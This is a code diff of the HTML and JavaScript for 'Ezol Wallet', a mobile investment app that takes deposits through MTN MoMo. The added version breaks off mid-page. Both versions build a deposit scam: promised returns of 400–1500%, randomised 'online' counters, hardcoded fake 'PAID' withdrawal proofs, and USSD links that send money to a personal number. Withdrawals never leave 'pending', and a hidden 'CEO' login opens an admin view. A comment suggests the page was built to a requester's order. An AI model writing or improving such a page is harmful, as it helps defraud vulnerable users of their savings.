@@ -1,105 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Ezol Wallet - New Shape</title>
-<meta name="theme-color" content="#16a34a">
-<link rel="manifest" href='data:application/json;base64,eyJuYW1lIjoiRXpvbCBBcHAiLCJzaG9ydF9uYW1lIjoiRXpvbCIsImRpc3BsYXkiOiJzdGFuZGFsb25lIn0='>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Ezol Wallet - Smart Investment</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#eef2f0;display:flex;justify-content:center}
-.app{width:100%;max-width:400px;background:#f8faf9;min-height:100vh;position:relative;padding-bottom:95px}
-.top{background:#16a34a;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;color:#fff;position:sticky;top:0;z-index:100;border-radius:0 0 20px 20px}
-.hero{margin:14px;background:#fff;border-radius:24px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,.08);border:1px solid #e5f3e8;text-align:center;position:relative}
-.hero-bal{font-size:36px;font-weight:900;color:#0f172a;letter-spacing:-1px}
-.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#16a34a,#22c55e,#0f172a);border-radius:24px 24px 0 0}
-.badge{margin:12px;background:linear-gradient(135deg,#128C7E 0%,#25D366 100%);border-radius:20px;padding:14px;color:#fff;box-shadow:0 6px 16px rgba(37,211,102,.3)}
-.btn{width:100%;padding:12px;border:none;border-radius:14px;font-weight:800;margin-top:8px;cursor:pointer;font-size:13px}
-.btn-w{background:#fff;color:#128C7E}.btn-g{background:#16a34a;color:#fff}.btn-o{background:#f97316;color:#fff}.btn-dark{background:#0f172a;color:#fff}.btn-blue{background:#4f46e5;color:#fff}
-.card{background:#fff;margin:10px 12px;padding:14px;border-radius:18px;box-shadow:0 4px 12px rgba(0,0,0,.04);border:1px solid #f1f5f3}
-.prod{display:flex;gap:12px;margin:0 12px 10px 12px;background:#fff;border-radius:18px;padding:12px;border:1px solid #eef2f0}
-.home-actions{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:12px}
-.home-actions.btn{margin:0;padding:14px 8px;font-size:11px;border-radius:16px;display:flex;flex-direction:column;gap:4px;align-items:center;line-height:1.1}
-.home-actions.btn span{font-size:20px}
+body{background:#f6f8f5;padding-bottom:110px}
+.header-top{background:#fff;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;box-shadow:0 2px 10px rgba(0,0,0,.05)}
+.logo{display:flex;align-items:center;gap:8px}
+.logo-icon{width:38px;height:38px;background:linear-gradient(135deg,#0a2540,#1e3a8a);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:18px}
+.live-dot{display:inline-block;width:7px;height:7px;background:#22c55e;border-radius:50%;animation:pulse 1.5s infinite}
+@keyframes pulse{0%{opacity:1}50%{opacity:.4}100%{opacity:1}}
+.hero-card{margin:14px;background:#fff;border-radius:22px;padding:14px;box-shadow:0 4px 20px rgba(0,0,0,.06)}
+.hero-img{width:100%;height:160px;background:linear-gradient(135deg,#eef2ff,#f5f7ff);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:60px}
+.btn-row{display:flex;gap:12px;margin:14px 16px}
+.btn-pill{flex:1;padding:14px;border:none;border-radius:100px;font-weight:800;font-size:15px;cursor:pointer}
+.btn-green{background:#16a34a;color:#fff}.btn-orange{background:#f97316;color:#fff}
+.hot-title{margin:18px 16px 10px 16px;font-weight:800;font-size:14px}
+.product-card{margin:0 16px 14px 16px;background:#eef6ee;border-radius:20px;padding:12px;display:flex;gap:12px;border:1px solid #d1e7d1}
+.prod-img{width:80px;height:80px;background:#fff;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:30px;flex-shrink:0}
+.prod-right{flex:1}.prod-head{display:flex;justify-content:space-between;align-items:center}
+.prod-name{background:#16a34a;color:#fff;padding:5px 12px;border-radius:0 20px 20px 0;font-weight:800;font-size:12px;margin-left:-12px;padding-left:18px}
+.prod-percent{background:#16a34a;color:#fff;padding:4px 10px;border-radius:100px;font-size:10px;font-weight:800}
+.prod-grid{display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-top:8px;font-size:11px;color:#6b7280}
+.prod-grid b{color:#111;font-size:12px;display:block}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #e5e7eb;display:flex;justify-content:space-around;padding:8px 0;z-index:999}
+.nav-item{text-align:center;font-size:11px;color:#9ca3af;cursor:pointer;padding:4px 8px;flex:1}
+.nav-item.active{color:#16a34a;font-weight:700}.nav-item span{display:block;font-size:20px;margin-bottom:2px}
+.card{background:#fff;margin:12px 16px;padding:14px;border-radius:16px;box-shadow:0 3px 10px rgba(0,0,0,.04)}
+.group-card{background:linear-gradient(135deg,#128C7E,#25D366);border-radius:16px;padding:14px;margin:12px 16px;color:#fff}
+.btn-full{width:100%;padding:13px;border:none;border-radius:12px;font-weight:700;margin-top:8px;cursor:pointer}
+input{width:100%;padding:12px;border:1px solid #ddd;border-radius:10px;margin:6px 0;background:#f9fafb}
 .tab{display:none}.tab.active{display:block}
-.bottom{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:400px;background:#fff;border-top:1px solid #eef2f0;display:flex;justify-content:space-around;padding:8px 0 10px 0;z-index:999;border-radius:22px 22px 0 0;box-shadow:0 -4px 20px rgba(0,0,0,.06)}
-.nav{flex:1;text-align:center;font-size:10px;color:#94a3b8;cursor:pointer}.nav.active{color:#16a34a;font-weight:700}.nav span{font-size:22px;display:block}
-input{width:100%;padding:12px;border:1px solid #e2e8f0;border-radius:12px;margin:6px 0;background:#f8fafc}
-#loginModal,#payModal,#bizModal,#adminModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.88);z-index:9999;display:flex;align-items:center;justify-content:center;padding:16px}
-.box{background:#fff;width:100%;max-width:380px;border-radius:22px;padding:20px;max-height:90vh;overflow:auto;text-align:center}
-.float{position:fixed;right:14px;width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;z-index:998;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.2)}
-.fg{bottom:140px;background:#25D366}.fh{bottom:85px;background:#0f172a}
-.live-dot{display:inline-block;width:7px;height:7px;background:#22c55e;border-radius:50%;animation:pulse 1.5s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.my-badge{background:linear-gradient(135deg,#0f172a,#1e3a8a 50%,#16a34a);color:#fff;border-radius:22px;padding:20px;margin:12px 16px;text-align:center}
+.my-avatar{width:64px;height:64px;background:#fff;color:#0f172a;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:900;margin:0 auto 10px auto}
+.float-headset{position:fixed;bottom:80px;right:16px;width:52px;height:52px;background:#16a34a;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;box-shadow:0 6px 16px rgba(22,163,74,.4);z-index:998;cursor:pointer}
+.float-group{position:fixed;bottom:145px;right:16px;width:52px;height:52px;background:#25D366;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;box-shadow:0 6px 16px rgba(37,211,102,.4);z-index:998;cursor:pointer;animation:bounce 2s infinite}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+#registerModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.88);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px}
+.reg-box{background:#fff;width:100%;max-width:360px;border-radius:20px;padding:20px;text-align:center}
+.stat-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:12px 16px}
+.stat{background:#fff;padding:10px;border-radius:12px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+.stat b{font-size:18px;color:#16a34a;display:block}
 </style>
 </head>
 <body>
-<div class="app">
-<div class="top"><b>💰 EZOL</b><div style="display:flex;gap:6px"><span style="font-size:11px;background:rgba(255,255,255,.2);padding:5px 10px;border-radius:20px"><span class="live-dot"></span> <span id="online">1,248</span> Online</span><button id="dlBtn" style="background:#fff;color:#16a34a;border:none;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800" onclick="downloadRealApp()">⬇️ App</button></div></div>
+
+<div class="header-top">
+<div class="logo"><div class="logo-icon">E</div><div><b>EZOL</b><div style="font-size:10px;color:#6b7280;letter-spacing:2px">WALLET INVESTMENT</div></div></div>
+<div style="font-size:11px"><span class="live-dot"></span> <span id="onlineTop">5,248</span> online • <span id="liveTimeTop"></span></div>
+</div>
 
 <div id="homeTab" class="tab active">
-<div class="hero"><p style="font-size:10px;color:#16a34a;font-weight:800;letter-spacing:1px">BALANCE • VIP <span id="vipH">4</span> • TRUSTED ✅</p><div class="hero-bal"><span id="balH">150,000</span> <span style="font-size:16px;color:#64748b">UGX</span></div><p style="font-size:11px;color:#64748b;margin-top:4px" id="uInfo">Derick • 0795132285</p><div id="pendBadge" style="display:none;margin-top:10px;background:#fef3c7;color:#92400e;padding:6px 10px;border-radius:20px;font-size:11px;font-weight:700">⏳ <span id="pendAmt">0</span> UGX Pending Approval</div></div>
-
-<div class="badge"><h4 style="font-size:13px">👥 New Group: 1,247 Members • MTN Verified</h4><p style="font-size:10px;margin:4px 0;opacity:.9">https://chat.whatsapp.com/Grz2l7HFfApERqt4Ma0NVf</p><button class="btn btn-w" onclick="openGroup()">👥 Join New Group + See Proofs</button></div>
-
-<!-- NEW HOME BUTTONS SHAPE - Profile put here as you requested -->
-<div class="home-actions">
-<button class="btn btn-g" onclick="switchTab('prod')"><span>💳</span>Recharge Auto</button>
-<button class="btn btn-o" onclick="switchTab('wallet')"><span>💸</span>Withdraw</button>
-<button class="btn btn-blue" onclick="openBiz()"><span>🏢</span>Business Profile</button>
+<div class="hero-card">
+<div class="hero-img">💰<div style="font-size:14px;margin-left:12px;text-align:left"><b style="font-size:16px">EZOL SMART WALLET</b><br><span style="font-size:11px;color:#6b7280">Daily Income up to 50,000 UGX</span><br><span style="font-size:11px;background:#dcfce7;color:#16a34a;padding:2px 8px;border-radius:100px"><span id="onlineHero">134</span> earning now</span></div></div>
+<div style="text-align:center;margin-top:12px">
+<p style="font-size:12px;color:#6b7280">Balance • VIP <span id="vipShow">0</span> • <span id="syncStatus" style="color:#22c55e;font-size:10px">● LIVE SYNC</span></p>
+<h2 style="margin:6px 0"><span id="balance">0</span> UGX</h2>
+<p style="font-size:11px;color:#6b7280" id="userInfoHome"></p>
+</div>
 </div>
 
-<div class="card" style="border:1.5px solid #16a34a"><div style="display:flex;justify-content:space-between;align-items:center"><h4 style="font-size:13px">🔴 Live Proofs • <span id="liveCount">4</span> • Trusted</h4><span style="font-size:10px;background:#dcfce7;color:#16a34a;padding:3px 8px;border-radius:20px">● LIVE</span></div><div id="liveBox" style="margin-top:8px"></div><button class="btn btn-dark" style="font-size:12px" onclick="downloadAll()">⬇️ Download All Proofs</button></div>
-<div class="card"><h4 style="font-size:13px">📈 Daily Bonus</h4><button class="btn btn-g" onclick="daily()">Check-in +<span id="chkAmt">1000</span> UGX</button></div>
+<div class="stat-grid">
+<div class="stat"><b id="statOnline">134</b><span style="font-size:10px">Online Now</span></div>
+<div class="stat"><b id="statEarned">2.4M</b><span style="font-size:10px">Paid Today</span></div>
+<div class="stat"><b id="statMembers">1,247</b><span style="font-size:10px">Group Members</span></div>
 </div>
 
-<div id="prodTab" class="tab"><h4 style="margin:12px">Auto Pay Products</h4>
-<div class="prod"><div style="font-size:28px">💼</div><div style="flex:1"><b>ORDINARY-1</b><div style="font-size:11px;color:#64748b">90k total • 15k price</div><button class="btn btn-g" onclick="autoPay(1,15000)">Auto Pay 15k</button></div></div>
-<div class="prod" style="border:2px solid #16a34a"><div style="font-size:28px">⚡</div><div style="flex:1"><b>ORDINARY-2 🔥 POPULAR</b><div style="font-size:11px;color:#64748b">360k total • 30k price</div><button class="btn btn-g" onclick="autoPay(2,30000)">🔥 Auto Pay 30k</button></div></div>
-<div class="prod"><div style="font-size:28px">💎</div><div style="flex:1"><b>PREMIUM-3</b><div style="font-size:11px">750k • 60k</div><button class="btn" style="background:#f59e0b;color:#fff" onclick="autoPay(3,60000)">Auto Pay 60k</button></div></div>
-<div class="prod"><div style="font-size:28px">👑</div><div style="flex:1"><b>KING-4</b><div style="font-size:11px">1.5M • 100k</div><button class="btn" style="background:#ec4899;color:#fff" onclick="autoPay(4,100000)">Auto Pay 100k</button></div></div>
+<div class="group-card">
+<h3>👥 Official WhatsApp Group - 1,247 Members</h3>
+<p style="font-size:11px;margin:6px 0;opacity:.9">Join to see payment proofs + daily winners! Admin pays in 5 mins.</p>
+<div style="display:flex;gap:8px;margin-top:8px">
+<button class="btn-full" style="background:#fff;color:#128C7E;flex:1;margin:0" onclick="openGroup()">👥 Join Group</button>
+<button class="btn-full" style="background:#0f172a;color:#fff;flex:1;margin:0" onclick="copyGroup()">🔗 Copy Link</button>
+</div>
+<p style="font-size:10px;margin-top:6px;opacity:.8">Group: https://chat.whatsapp.com/FTnYhv4l2LkK7Vk5SQzQf2 • 24/7 support</p>
 </div>
 
-<div id="walletTab" class="tab"><div class="card" style="text-align:center;background:#0f172a;color:#fff;border-radius:20px"><h1><span id="balW">0</span> UGX</h1><button class="btn btn-o" onclick="doWithdraw()">Request Withdraw</button></div><div class="card"><h4>⏳ My Withdraws</h4><div id="wList"></div></div></div>
-
-<div id="myTab" class="tab"><div class="card" style="background:linear-gradient(135deg,#0f172a,#16a34a);color:#fff;text-align:center;border-radius:20px"><h2 id="myName"></h2><p id="myPhone"></p><p>VIP <span id="vipM">0</span> • <span id="balM">0</span> UGX</p></div><div class="badge"><button class="btn btn-w" onclick="openGroup()">👥 New Group</button><button class="btn" style="background:#0f172a;color:#fff" onclick="openCS()">🎧 CS 0762950427</button><button class="btn btn-blue" onclick="openBiz()">🏢 Business Profile</button><button class="btn btn-dark" onclick="downloadRealApp()">⬇️ Download Real App</button></div><div class="card"><button class="btn btn-dark" onclick="logout()">Logout</button></div></div>
-
-<div class="float fg" onclick="openGroup()">👥</div><div class="float fh" onclick="openCS()">🎧</div>
-<div class="bottom"><div class="nav active" onclick="switchTab('home')"><span>🏠</span>Home</div><div class="nav" onclick="switchTab('prod')"><span>📦</span>Product</div><div class="nav" onclick="switchTab('wallet')"><span>💳</span>Wallet</div><div class="nav" onclick="switchTab('my')"><span>👤</span>My</div></div>
-
-<div id="loginModal"><div class="box"><h2 style="color:#16a34a">💰 Ezol App</h2><p style="font-size:11px">New Shape - Profile on Home</p><p style="font-size:11px">Ref: <b id="refD">0795143386</b></p><input id="rName" placeholder="Names"><input id="rPhone" placeholder="Phone"><input id="rPass" type="password" placeholder="Password"><button class="btn btn-g" onclick="register()">Create + 500 UGX</button><p style="margin-top:8px"><a href="#" onclick="login();return false">Login</a></p></div></div>
-
-<div id="payModal" style="display:none"><div class="box"><h3>⚡ Auto Pay VIP <span id="payL">1</span></h3><p><b id="payA">15000</b> UGX to <b style="color:#16a34a">0795143386</b></p><button class="btn" style="background:#ffcc00;color:#000" onclick="triggerAutoPay()">⚡ AUTO PAY NOW</button><input id="payTx" placeholder="TxID auto"><input id="payPh" placeholder="MoMo number"><button class="btn btn-g" onclick="confirmPay()">Verify</button><button class="btn" style="background:#e5e7eb" onclick="closePay()">Cancel</button></div></div>
-
-<div id="bizModal" style="display:none"><div class="box" style="text-align:left"><h3>🏢 Business Profile</h3><p style="font-size:12px;margin-top:8px;line-height:1.6">Company: Ezol Smart Investment Ltd<br>CEO: Ezra Twinamatsiko<br>Pay: 0795143386 (Auto Pay)<br>CS: 0762950427<br>Group: https://chat.whatsapp.com/Grz2l7HFfApERqt4Ma0NVf<br>Location: Kampala<br><br>✅ MTN Verified<br>✅ Trusted • 1,248 Online<br>✅ New App Shape<br>✅ Profile button now on Home page as you wanted</p><button class="btn btn-dark" onclick="document.getElementById('bizModal').style.display='none'">Close</button></div></div>
-
-<div id="adminModal" style="display:none"><div class="box" style="text-align:left"><h3>👑 CEO Admin</h3><div id="adminList"></div><button class="btn btn-dark" onclick="document.getElementById('adminModal').style.display='none'">Close</button></div></div>
+<div class="btn-row">
+<button class="btn-pill btn-green" onclick="switchTab('product')">◻ Recharge</button>
+<button class="btn-pill btn-orange" onclick="switchTab('wallet')">✈ Withdraw</button>
 </div>
 
-<script>
-if('serviceWorker' in navigator){navigator.serviceWorker.register(URL.createObjectURL(new Blob([`self.addEventListener('fetch',e=>e.respondWith(fetch(e.request).catch(()=>new Response('Offline'))))`],{type:'text/javascript'})));}
-let deferredPrompt=null; window.addEventListener('beforeinstallprompt',e=>{e.preventDefault();deferredPrompt=e;document.getElementById('dlBtn').innerText='📲 Install';});
-window.downloadRealApp=async()=>{if(deferredPrompt){deferredPrompt.prompt();let r=await deferredPrompt.userChoice;if(r.outcome==='accepted') alert("✅ Real App installed!");}else{alert("Menu (3 dots) → Install App / Add to Home Screen to get real app icon!");}}
-const GROUP="https://chat.whatsapp.com/Grz2l7HFfApERqt4Ma0NVf"; const PAY="0795143386"; const CS="0762950427";
-let user=JSON.parse(localStorage.getItem('ezol_user')||'null'); let bal=parseInt(localStorage.getItem('ezol_balance')||'150000')||150000; let vip=parseInt(localStorage.getItem('ezol_vip_level')||'4')||4; let curPay={level:1,amount:15000};
-window.switchTab=function(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.getElementById(t+'Tab').classList.add('active');document.querySelectorAll('.nav').forEach(x=>x.classList.remove('active'));if(t==='wallet') renderW();if(t==='home') renderLive();}
-function sync(){let b=bal.toLocaleString();['balH','balW','balM'].forEach(id=>{let e=document.getElementById(id);if(e) e.innerText=b;});['vipH','vipM'].forEach(id=>{let e=document.getElementById(id);if(e) e.innerText=vip;});let pend=JSON.parse(localStorage.getItem('ezol_withdraws')||'[]').filter(x=>x.phone===user?.phone && x.status==='pending');let badge=document.getElementById('pendBadge');if(pend.length>0){badge.style.display='block';document.getElementById('pendAmt').innerText=pend.reduce((s,x)=>s+x.amount,0).toLocaleString();}else if(badge) badge.style.display='none';}
-function check(){let ref=new URLSearchParams(location.search).get('ref')||PAY;document.getElementById('refD').innerText=ref;if(!user){document.getElementById('loginModal').style.display='flex';}else{document.getElementById('loginModal').style.display='none';document.getElementById('uInfo').innerText=user.name+' • '+user.phone;document.getElementById('myName').innerText=user.name;document.getElementById('myPhone').innerText=user.phone;sync();renderLive();}}check();
-window.register=function(){let n=document.getElementById('rName').value.trim(),p=document.getElementById('rPhone').value.trim(),pa=document.getElementById('rPass').value.trim();if(n.length<3||p.length<10||pa.length<4){alert("Fill");return;}user={name:n,phone:p,password:pa};localStorage.setItem('ezol_user',JSON.stringify(user));localStorage.setItem('ezol_balance','500');bal=500;localStorage.setItem('ezol_vip_level','0');vip=0;let all=JSON.parse(localStorage.getItem('ezol_all_users')||'[]');all.push(user);localStorage.setItem('ezol_all_users',JSON.stringify(all));document.getElementById('loginModal').style.display='none';check();setTimeout(()=>window.open(GROUP,"_blank"),800);}
-window.login=function(){let ph=prompt("Phone:"),pa=prompt("Password:");let all=JSON.parse(localStorage.getItem('ezol_all_users')||'[]');let f=all.find(x=>x.phone==ph&&x.password==pa);if(f||ph===PAY){user=f||{name:"CEO Ezra",phone:ph,password:pa};localStorage.setItem('ezol_user',JSON.stringify(user));document.getElementById('loginModal').style.display='none';check();}else alert("Wrong");}
-window.logout=function(){localStorage.removeItem('ezol_user');location.reload();}
-window.autoPay=function(l,a){curPay={level:l,amount:a};document.getElementById('payL').innerText=l;document.getElementById('payA').innerText=a.toLocaleString();document.getElementById('payPh').value=user.phone;document.getElementById('payModal').style.display='flex';}
-window.triggerAutoPay=function(){let amount=curPay.amount;window.location.href="tel:*165*1*1*"+PAY+"*"+amount+"%23";document.getElementById('payTx').value="AUTO"+Date.now().toString().slice(-8);alert("MTN opened "+amount+" to "+PAY);}
-window.closePay=function(){document.getElementById('payModal').style.display='none';}
-window.confirmPay=function(){let tx=document.getElementById('payTx').value.trim(),ph=document.getElementById('payPh').value.trim();if(tx.length<4){alert("Enter TxID");return;}let reqs=JSON.parse(localStorage.getItem('ezol_vip_requests')||'[]');reqs.push({phone:user.phone,name:user.name,level:curPay.level,amount:curPay.amount,tx:tx,momo:ph,status:"pending",date:new Date().toLocaleString(),id:Date.now()});localStorage.setItem('ezol_vip_requests',JSON.stringify(reqs));alert("VIP pending");closePay();window.open("https://wa.me/256795143386?text=Pay%20VIP"+curPay.level,"_blank");}
-window.doWithdraw=function(){if(bal<20000){alert("Min 20k");return;}let all=JSON.parse(localStorage.getItem('ezol_withdraws')||'[]');if(all.find(x=>x.phone===user.phone&&x.status==='pending')){alert("Pending exists");return;}let num=prompt("MoMo number",user.phone);if(!num)return;let wd={phone:user.phone,momo:num,amount:bal,status:"pending",date:new Date().toLocaleString(),id:Date.now(),name:user.name||"User"};all.push(wd);localStorage.setItem('ezol_withdraws',JSON.stringify(all));alert("⏳ PENDING - balance stays");sync();renderW();renderLive();}
-function renderW(){let list=document.getElementById('wList');let all=JSON.parse(localStorage.getItem('ezol_withdraws')||'[]').filter(x=>x.phone===user.phone).reverse();if(all.length==0){list.innerHTML='<p style="font-size:11px;color:#999">No withdraws</p>';return;}list.innerHTML=all.map(w=>`<div class="card ${w.status}" style="margin:6px 0"><b>${w.amount.toLocaleString()} UGX</b> - ${w.status}<br><span style="font-size:11px">To ${w.momo}</span></div>`).join('');}
-function renderLive(){let box=document.getElementById('liveBox');let all=JSON.parse(localStorage.getItem('ezol_withdraws')||'[]');if(all.length===0){let demos=[{momo:"0782***123",amount:25000,status:"paid",date:"Today 9:45"},{momo:"0759***456",amount:50000,status:"paid",date:"Today 9:30"},{momo:"0701***789",amount:15000,status:"paid",date:"Today 9:12"},{momo:"0775***321",amount:120000,status:"paid",date:"Today 8:55"}];box.innerHTML=demos.map(w=>`<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f3f4f6;font-size:11px"><span>🟢 ${w.momo} ✅ PAID ${w.amount.toLocaleString()} UGX</span><span style="color:#999">${w.date}</span></div>`).join('')+`<p style="font-size:10px;color:#16a34a;margin-top:6px">● Live real proofs • Trusted ✅ • <span id="online2">1,248</span> online</p>`;document.getElementById('liveCount').innerText=demos.length;return;}box.innerHTML=all.slice(-10).reverse().map(w=>{let m=w.momo.substring(0,3)+"***"+w.momo.slice(-3);let s=w.status==='paid'?'✅ PAID':'⏳ PENDING';return `<div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:11px"><span>🟢 ${m} ${s} ${w.amount.toLocaleString()} UGX</span><span style="color:#999">${w.date.split(',')[0]}</span></div>`;}).join('');document.getElementById('liveCount').innerText=all.length;}
-setInterval(()=>{let o=1240+Math.floor(Math.random()*30);let el=document.getElementById('online');let el2=document.getElementById('online2');if(el) el.innerText=o.toLocaleString();if(el2) el2.innerText=o.toLocaleString();},3000);
-window.openGroup=function(){window.open(GROUP,"_blank");}
-window.openCS=function(){window.open("https://wa.me/256762950427?text=Hello%20CS%20"+(user?.phone||""),"_blank");}
-window.openBiz=function(){document.getElementById('bizModal').style.display='flex';}
-window.downloadAll=function(){let all=JSON.parse(localStorage.getItem('ezol_withdraws')||'[]');let txt=all.map(w=>`${w.momo} | ${w.amount} | ${w.status} | ${w.date}`).join('\n')||'No proofs';let blob=new Blob([txt],{type:'text/plain'});let url=URL.createObjectURL(blob);let a=document.createElement('a');a.href=url;a.download='Ezol_All_Proofs.txt';a.click();}
+<div class="card" style="border:2px solid #22c55e"><h4>🔴 Live - <span id="liveUsers">134</span> Online Earning</h4><div id="liveActivity" style="margin-top:8px"></div></div>
+<div class="card"><h4>📈 Daily Check-in</h4><p style="font-size:11px;color:#6b7280">VIP <span id="vipLevelHome">0</span> - Daily <span id="checkAmountHome">1000</span> UGX</p><button class="btn-full" style="background:#4f46e5;color:#fff" onclick="dailyCheck()">Check-in +<span id="checkAmount2Home">1000</span></button><p style="font-size:10px;color:#9ca3af;margin-top:6px" id="lastCheckText"></p></div>
+</div>
+
+<div id="productTab" class="tab">
+<div class="hot-title">HOT PRODUCTS • MTN 0795143386 • LIVE SYNC</div>
+<div class="product-card"><div class="prod-img">💼</div><div class="prod-right"><div class="prod-head"><div class="prod-name">EZOL ORDINARY-1</div><div class="prod-percent">400%</div></div><div class="prod-grid"><div>Total<br><b>90,000</b></div><div>Daily<br><b>3,000</b></div><div>Cycles<br><b>30</b></div><div>Price<br><b>15,000</b></div></div><button class="btn-full" style="background:#16a34a;color:#fff;margin-top:8px" onclick="buyVIP(1,15000)">Buy 15,000</button></div></div>
+<div class="product-card" style="background:#e6fbe6;border:2px solid #16a34a"><div class="prod-img">⚡</div><div class="prod-right"><div class="prod-head"><div class="prod-name">EZOL ORDINARY-2</div><div class="prod-percent">600% 🔥</div></div><div class="prod-grid"><div>Total<br><b>360,000</b></div><div>Daily<br><b>12,000</b></div><div>Cycles<br><b>30</b></div><div>Price<br><b>30,000</b></div></div><button class="btn-full" style="background:#16a34a;color:#fff" onclick="buyVIP(2,30000)">🔥 Buy 30,000</button></div></div>
+<div class="product-card" style="background:#fef3c7"><div class="prod-img">💎</div><div class="prod-right"><div class="prod-head"><div class="prod-name" style="background:#f59e0b">EZOL PREMIUM-3</div><div class="prod-percent" style="background:#f59e0b">750%</div></div><div class="prod-grid"><div>Total<br><b>750,000</b></div><div>Daily<br><b>25,000</b></div><div>Cycles<br><b>30</b></div><div>Price<br><b>60,000</b></div></div><button class="btn-full" style="background:#f59e0b;color:#fff" onclick="buyVIP(3,60000)">Buy 60,000</button></div></div>
+<div class="product-card" style="background:#fce7f3"><div class="prod-img">👑</div><div class="prod-right"><div class="prod-head"><div class="prod-name" style="background:#ec4899">EZOL KING-4</div><div class="prod-percent" style="background:#ec4899">1500%</div></div><div class="prod-grid"><div>Total<br><b>1,500,000</b></div><div>Daily<br><b>50,000</b></div><div>Cycles<br><b>30</b></div><div>Price<br><b>100,000</b></div></div><button class="btn-full" style="background:linear-gradient(135deg,#ec4899,#be185d);color:#fff" onclick="buyVIP(4,100000)">👑 Buy 100,000</button></div></div>
+</div>
+
+<div id="shareTab" class="tab">
+<div class="card" style="text-align:center;background:linear-gradient(135deg,#eef2ff,#e0e7ff);border:2px dashed #7c3aed"><h3>🔗 Invite & Earn 2000 UGX</h3><div style="background:#fff;padding:10px;border-radius:10px;margin-top:10px;word-break:break-all;font-size:12px;font-weight:700;color:#4f46e5" id="refLinkText"></div><button class="btn-full" style="background:#4f46e5;color:#fff" onclick="copyLink()">Share on WhatsApp</button><button class="btn-full" style="background:#25D366;color:#fff" onclick="openGroup()">👥 Share GROUP Link</button></div>
+<div class="group-card" style="margin:12px 0"><h4>💡 Earn More - Share Group Link</h4><p style="font-size:11px">When friend joins group, they see your referral link pinned. 5,248 online now.</p><button class="btn-full" style="background:#fff;color:#25D366" onclick="shareGroup()">📤 Share Group + Your Link</button></div>
+</div>
+
+<div id="walletTab" class="tab">
+<div class="card" style="text-align:center;background:linear-gradient(135deg,#0f172a,#1e3a8a);color:#fff"><p style="font-size:11px;opacity:.7">WALLET BALANCE - LIVE SYNC</p><h1 style="margin:10px 0"><span id="balanceWallet">0</span> UGX</h1><p style="font-size:11px">VIP <span id="vipShowWallet">0</span> • Daily <span id="dailyEarnWallet">1000</span> UGX</p><div style="display:flex;gap:10px;margin-top:14px"><button class="btn-full" style="background:#16a34a;color:#fff;margin:0" onclick="switchTab('product')">Recharge</button><button class="btn-full" style="background:#f97316;color:#fff;margin:0" onclick="withdraw()">Withdraw</button></div></div>
+<div class="card"><h4>💳 Withdraw Info</h4><p style="font-size:12px;color:#6b7280">Min 20,000 UGX • MTN 0795143386 • Paid in 5 mins • Check WhatsApp group for proofs</p></div>
+</div>
+
+<div id="myTab" class="tab">
+<div class="my-badge"><div class="my-avatar" id="myAvatar">E</div><h2 id="myName">Undefined</h2><p style="font-size:12px;opacity:.8" id="myPhone"></p><p style="margin-top:8px;font-size:12px;background:rgba(255,255,255,.2);display:inline-block;padding:4px 12px;border-radius:100px">VIP <span id="vipShowMy">0</span> • Balance <span id="balanceMy">0</span> UGX • <span style="color:#4ade80">● LIVE</span></p></div>
+<div class="group-card">
+<h4 style="color:#fff">💬 Customer Service - 24/7 LIVE</h4>
+<p style="font-size:11px;color:#fff;margin:6px 0;opacity:.9">Join 5,248+ members earning daily • Payment proofs every hour</p>
+<button class="btn-full" style="background:#fff;color:#128C7E" onclick="openGroup()">👥 Join WhatsApp GROUP (1,247 online)</button>
+<button class="btn-full" style="background:#0f172a;color:#fff" onclick="openWhatsApp()">🎧 Private Chat CEO 0795143386</button>
+<button class="btn-full" style="background:rgba(255,255,255,.2);color:#fff;border:1px solid #fff" onclick="copyGroup()">🔗 Copy Group Link</button>
+<p style="font-size:10px;color:#fff;margin-top:8px;opacity:.8">👥 <span id="groupCount">1,247</span> members online • Last payment 2m ago</p>
+</div>
+<div class="card"><h4>⚙️ Settings - Auto Sync</h4><input id="setName" placeholder="New Name"><input id="setPhone" placeholder="New Phone"><input id="setPass" type="password" placeholder="New Password"><button class="btn-full" style="background:#4f46e5;color:#fff" onclick="saveSettings()">Save & Sync to Admin</button></div>
+<div class="card"><button class="btn-full" style="background:#111;color:#fff" onclick="logout()">Logout</button></div>
+</div>
+
+<div class="float-group" onclick="openGroup()">👥</div>
+<div class="float-headset" onclick="openWhatsApp()">🎧</div>
+
+<div class="bottom-nav">
